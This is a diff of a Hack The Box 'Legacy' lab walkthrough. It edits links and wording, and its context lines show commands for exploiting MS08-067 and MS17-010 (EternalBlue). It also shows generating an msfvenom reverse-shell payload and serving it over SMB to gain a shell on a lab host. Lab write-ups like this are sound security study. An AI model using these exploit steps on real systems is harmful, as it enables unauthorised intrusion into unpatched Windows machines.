@@ -110,8 +110,6 @@ python3 ms08-067.py 10.10.10.4 6 445 > /dev/null
 
 ### Microsoft Security Bulletin MS17-010 (EternalBlue/MS17-010)
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/legacy)
-
 Using exploit `send_and_execute.py` at <a href='https://github.com/helviojunior/MS17-010' target="blank">https://github.com/helviojunior/MS17-010</a>
 
 Generate reverse shell file `shell.exe` in the same payload's folder using `msfvenom`.
@@ -128,7 +126,7 @@ python send_and_execute.py 10.10.10.4 shell.exe > /dev/null
 
 ![](images/5.png)
 
-I also custom exploit file by input command to execute.
+I also custom exploit file by input command to execution.
 
 ```
 sudo smbserver.py public . > /dev/null
@@ -156,8 +154,8 @@ At the client, execute command `whoami`
 
 ## Reference
 
-[worawit/MS17-010](https://github.com/worawit/MS17-010)
+[https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)
 
-<a href='https://0xdf.gitlab.io/2019/02/21/htb-legacy.html' target="blank">HTB: Legacy of 0xdf hacks stuff</a>
+<a href='https://0xdf.gitlab.io/2019/02/21/htb-legacy.html' target="blank">https://0xdf.gitlab.io/2019/02/21/htb-legacy.html</a>
 
-<a href='https://pycryptodome.readthedocs.io/en/latest/src/installation.html' target="blank">Install PyCrypto library</a>
+<a href='https://pycryptodome.readthedocs.io/en/latest/src/installation.html' target="blank">https://pycryptodome.readthedocs.io/en/latest/src/installation.html</a>
